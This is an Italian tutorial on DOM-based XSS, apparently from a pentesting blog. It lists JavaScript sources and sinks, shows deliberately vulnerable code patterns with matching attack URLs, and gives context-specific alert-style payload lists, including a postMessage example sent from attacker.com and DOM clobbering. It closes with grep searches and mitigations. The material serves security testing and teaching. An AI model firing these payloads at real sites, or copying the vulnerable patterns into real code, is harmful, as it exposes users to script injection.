---
title: 'DOM XSS: Cos''è e come trovare source e sink nascosti nel JavaScript'
slug: dom-xss
description: >-
  Guida pratica al DOM XSS: source, sink, location.hash, innerHTML, eval,
  postMessage, DOM Invader, SPA React/Vue/Angular e analisi client-side nel
  pentest.
image: /dom-xss.webp
draft: false
date: 2026-03-28T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - xss
  - dom-clobbering
---

**DOM-based XSS** è la variante più sottile del Cross-Site Scripting. Il server non è coinvolto nel processo di iniezione: il payload viene processato interamente dal JavaScript client-side, spesso senza lasciare traccia nei log server-side e senza essere visibile agli scanner tradizionali.

È il tipo di XSS più difficile da trovare automaticamente e più facile da non patchare — perché richiede di leggere e capire il JavaScript dell'applicazione, non solo l'HTML della response.

→ Torna alla guida principale: [XSS Completo](https://hackita.it/articoli/xss)

***

## Come Funziona: Sources e Sinks

In DOM XSS tutto ruota intorno a due concetti:

**Source** — dove arriva l'input dell'utente (lato client)\
**Sink** — dove quell'input viene usato in modo potenzialmente pericoloso

Se esiste un percorso di flusso dati non sanitizzato tra una source e un sink pericoloso, hai DOM XSS.

```
SOURCE → (nessuna sanitizzazione) → SINK → JavaScript eseguito
```

***

## Sources Comuni

```javascript
// URL e suoi componenti
location.href
location.search        // ?parametro=valore
location.hash          // #valore
location.pathname      // /path/della/pagina

// Documento
document.URL
document.referrer
document.baseURI

// Messaggi tra finestre
window.name
postMessage event data

// Storage
localStorage.getItem()
sessionStorage.getItem()

// Dati DOM
document.cookie
```

`location.hash` è particolarmente interessante: non viene inviato al server, quindi non appare nei log e spesso sfugge ai WAF.

***

## Sinks Pericolosi

### Esecuzione Diretta di Codice

```javascript
eval(userInput)                    // Pericolosissimo
setTimeout(userInput, 1000)        // Se stringa, viene eval'd
setInterval(userInput, 1000)       // Idem
new Function(userInput)            // Come eval
```

### HTML Injection → XSS

```javascript
element.innerHTML = userInput      // Parsing HTML + JS
element.outerHTML = userInput      // Idem
document.write(userInput)          // Scrive HTML nel documento
document.writeln(userInput)        // Idem
```

### Navigation → javascript: URI

```javascript
location = userInput               // javascript:alert(1) funziona
location.href = userInput
location.assign(userInput)
location.replace(userInput)
window.open(userInput)
element.src = userInput            // Per iframe, script
```

### Meno Ovvi

```javascript
element.setAttribute('src', userInput)     // Se src su script/iframe
element.setAttribute('href', userInput)    // Se href su <a>
jQuery.html(userInput)                     // innerHTML via jQuery
$().append(userInput)                      // Idem
```

***

## Pattern Vulnerabili Comuni

### Pattern 1: location.hash → innerHTML

```html
<div id="result"></div>
<script>
// VULNERABILE: hash diritto in innerHTML
var search = decodeURIComponent(location.hash.slice(1));
document.getElementById('result').innerHTML = 'Cercando: ' + search;
</script>
```

**URL di attacco:**

```
http://target.com/page.html#<img src=x onerror=alert(document.domain)>
```

### Pattern 2: URLSearchParams → document.write

```html
<script>
var lang = new URLSearchParams(location.search).get('lang');
document.write('<script src="/js/' + lang + '.js"><\/script>');
</script>
```

**URL di attacco:**

```
http://target.com/page?lang=x.js"></script><script>alert(1)</script><script>
```

### Pattern 3: location.search → eval (via jQuery JSONP)

```javascript
// Codice vulnerabile
var callback = location.search.match(/callback=([^&]+)/)[1];
eval(callback + '(' + JSON.stringify(data) + ')');
```

**URL di attacco:**

```
?callback=alert(document.domain);//
```

### Pattern 4: postMessage senza validazione origine

```javascript
// Riceve messaggi da qualsiasi origine
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});
```

**Exploitation:**

```javascript
// Da attacker.com (in una pagina che embeds il target in iframe)
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
```

### Pattern 5: window\.name (persistente tra navigazioni)

```javascript
// Codice vulnerabile
document.getElementById('box').innerHTML = window.name;
```

`window.name` persiste quando navighi da un dominio all'altro, se il target viene aperto in una stessa finestra/tab. Un attacker può impostare `window.name` sul proprio dominio e poi redirigere al target.

***

## Analisi del Codice JavaScript

### Approccio Manuale

1. Apri il sito, F12 → Sources
2. Cerca pattern vulnerabili con Ctrl+Shift+F (cerca nel sorgente):
   * `innerHTML`
   * `document.write`
   * `eval(`
   * `location.hash`
   * `location.search`
   * `setTimeout(`
3. Per ogni occorrenza, traccia: da dove arriva l'input? È sanitizzato prima di arrivare al sink?

### Con Burp Suite — DOM Invader

Burp Suite Pro include **DOM Invader**: uno strumento integrato nel browser che:

* Mappa automaticamente sources e sinks
* Traccia il flusso dei dati
* Segnala percorsi exploitabili
* Suggerisce payload per il context trovato

È lo strumento più efficace per DOM XSS analysis.

### Ricerca con grep / ripgrep

Quando hai accesso al codice sorgente (code review, file JS scaricati):

```bash
# Sinks pericolosi
grep -rn "innerHTML\|outerHTML\|document\.write\|eval(" src/

# Sources
grep -rn "location\.hash\|location\.search\|location\.href" src/

# Pattern jQuery vulnerabili
grep -rn '\.html(\|\.append(\|\.prepend(' src/
```

***

## Payload DOM XSS per Context

### Nella Hash (location.hash)

```javascript
// Se finisce in innerHTML
#<img src=x onerror=alert(1)>
#<svg/onload=alert(1)>

// Se finisce in document.write (devi chiudere il context)
#</script><script>alert(1)</script>
#<img src=x onerror=alert(1)>
```

### In URLSearchParams (location.search)

```javascript
// innerHTML context
?q=<img src=x onerror=alert(1)>

// JavaScript string context
?q='-alert(1)-'
?q=\'-alert(1)//

// document.write con script src
?file=x.js"></script><script>alert(1)</script><script src="
```

### In eval / setTimeout

```javascript
?callback=alert(1)
?expr=1;alert(1)
?cmd=alert(document.domain)
```

***

## DOM XSS in Applicazioni Single Page (SPA)

Le SPA (React, Angular, Vue) hanno superfici DOM XSS particolari.

**React** — `dangerouslySetInnerHTML` è il sink principale:

```javascript
// VULNERABILE
<div dangerouslySetInnerHTML={{__html: userInput}} />

// SICURO — non usa dangerouslySetInnerHTML
<div>{userInput}</div>  // React escapa automaticamente
```

**Angular** — bypass del sanitizer:

```javascript
// VULNERABILE
this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
```

**Vue** — `v-html` directive:

```html
<!-- VULNERABILE -->
<div v-html="userInput"></div>

<!-- SICURO -->
<div>{{ userInput }}</div>  <!-- Escaping automatico -->
```

Nelle SPA cerca `dangerouslySetInnerHTML`, `v-html`, `bypassSecurity*` — sono bandiere rosse immediate.

***

## Testing con DOM Clobbering

DOM Clobbering è una variante avanzata: inietti HTML che "sovrascrive" proprietà DOM usate dal codice JavaScript dell'applicazione.

```html
<!-- Se il codice fa: config.apiUrl + '/endpoint' -->
<form id="config"><input name="apiUrl" value="javascript:alert(1)//"></form>
```

Ora `config.apiUrl` punta al tuo valore — il JS legge dal DOM senza saperlo.

***

## Mitigazione

**Per developer:**

```javascript
// SBAGLIATO
element.innerHTML = userInput;

// GIUSTO — testo puro
element.textContent = userInput;

// GIUSTO — se servono tag, usa DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);

// SBAGLIATO per navigazione
location.href = userInput;

// GIUSTO — valida che sia un URL relativo sicuro
if (/^\/[^/]/.test(userInput)) location.href = userInput;
```

**Regola principale:** non portare mai input utente direttamente in un sink senza sanitizzazione. `textContent` invece di `innerHTML` risolve la maggior parte dei casi.

***

*Disclaimer: Usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato penale (art. 615-ter c.p.).*
